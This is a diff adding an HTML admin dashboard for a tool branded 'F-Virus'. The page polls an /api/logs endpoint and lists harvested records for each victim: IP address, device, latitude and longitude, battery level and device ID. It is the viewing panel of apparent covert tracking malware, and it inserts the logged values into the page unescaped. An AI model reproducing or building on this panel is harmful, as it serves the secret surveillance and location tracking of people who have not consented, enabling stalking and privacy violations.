@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>F-Virus Admin Dashboard</title>
+<meta http-equiv="refresh" content="5">
+<style>
+body{font-family:Arial;background:#0b0f14;color:#e6e6e6}
+.box{max-width:900px;margin:20px auto;padding:16px;background:#121826;border-radius:12px}
+.item{border-bottom:1px solid #222;padding:10px 0}
+h1{color:#18c964}
+.small{opacity:.8}
+</style>
+</head>
+<body>
+<div class="box">
+<h1>F-Virus Live Admin Dashboard</h1>
+<div id="logs"></div>
+<p class="small">
+Tool coded by Tanzanian hacker <b>Mr.virus</b> from Tanzania 🇹🇿<br>
+Any problem visit my IG profile: <b>@uknown_virus4040x</b>
+</p>
+</div>
+
+<script>
+async function load(){
+  const r = await fetch("/api/logs");
+  const d = await r.json();
+  let html = "";
+  d.slice().reverse().forEach(x=>{
+    html += `
+    <div class="item">
+      <b>Time:</b> ${x.time}<br>
+      <b>IP:</b> ${x.ip}<br>
+      <b>Device:</b> ${x.device}<br>
+      <b>Lat/Lon:</b> ${x.lat}, ${x.lon}<br>
+      <b>Battery:</b> ${x.battery}<br>
+      <b>Device ID:</b> ${x.device_id}
+    </div>`;
+  });
+  document.getElementById("logs").innerHTML = html || "<i>No data yet</i>";
+}
+load();
+</script>
+</body>
+</html>
+
